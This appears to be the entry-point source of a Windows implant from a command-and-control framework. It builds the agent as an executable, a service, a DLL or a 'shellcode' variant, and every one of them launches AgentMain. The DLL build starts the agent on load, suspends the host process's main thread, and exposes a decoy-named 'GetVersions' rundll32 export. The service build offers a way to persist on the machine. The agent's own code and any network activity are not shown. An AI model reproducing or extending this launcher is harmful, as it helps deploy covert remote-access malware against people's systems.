#include "main.h"
#include "config.h"

#if defined(DEBUG)

int main()
{
    AgentMain(NULL);
    return 0;
}

#elif defined(BUILD_SVC)

SERVICE_STATUS        ServiceStatus = { 0 };
SERVICE_STATUS_HANDLE hStatus;

void ServiceMain(int argc, char** argv);
void ControlHandler(DWORD request);

void ServiceMain(int argc, char** argv)
{
    CHAR* SvcName = getServiceName();
    hStatus = RegisterServiceCtrlHandlerA(SvcName, (LPHANDLER_FUNCTION)ControlHandler);
    if (!hStatus)
        return;

    ServiceStatus.dwServiceType = SERVICE_WIN32;
    ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;

    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(hStatus, &ServiceStatus);

    AgentMain(NULL);

    ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(hStatus, &ServiceStatus);
}

void ControlHandler(DWORD request)
{
    switch (request) {
    case SERVICE_CONTROL_STOP:
        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        break;
    case SERVICE_CONTROL_SHUTDOWN:
        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        break;
    default:
        break;
    }

    SetServiceStatus(hStatus, &ServiceStatus);
}

int main()
{
    SERVICE_TABLE_ENTRYA ServiceTable[2];
    CHAR* SvcName = getServiceName();
    ServiceTable[0].lpServiceName = (LPSTR)SvcName;
    ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTIONA)ServiceMain;

    ServiceTable[1].lpServiceName = NULL;
    ServiceTable[1].lpServiceProc = NULL;

    StartServiceCtrlDispatcherA(ServiceTable);

    return 0;
}

#elif defined(BUILD_DLL)

static volatile LONG g_AgentInitialized = FALSE;
static volatile HANDLE g_AgentThread = NULL;
static DWORD g_MainThreadId = 0;

DWORD WINAPI AgentHolderThread(LPVOID param)
{
    HANDLE hMainThread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, g_MainThreadId);
    if (hMainThread)
        SuspendThread(hMainThread);

    AgentMain(NULL);

    if (hMainThread) {
        ResumeThread(hMainThread);
        CloseHandle(hMainThread);
    }

    return 0;
}

void run()
{
    if (InterlockedCompareExchange(&g_AgentInitialized, TRUE, FALSE) == FALSE) {
        g_MainThreadId = GetCurrentThreadId();
        g_AgentThread = CreateThread(NULL, 0, AgentHolderThread, NULL, 0, NULL);
        if (!g_AgentThread)
            InterlockedExchange(&g_AgentInitialized, FALSE);
    }
}

extern "C" __declspec(dllexport) void CALLBACK GetVersions(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
    run();
    if (g_AgentThread) {
        WaitForSingleObject(g_AgentThread, INFINITE);
        CloseHandle(g_AgentThread);
        g_AgentThread = NULL;
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);
        run();
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

#elif defined(BUILD_SHELLCODE)

__declspec(dllexport) void GetVersions() {};

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    AgentMain(NULL);
    return TRUE;
}
#else

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    AgentMain(NULL);
    return 0;
}

#endif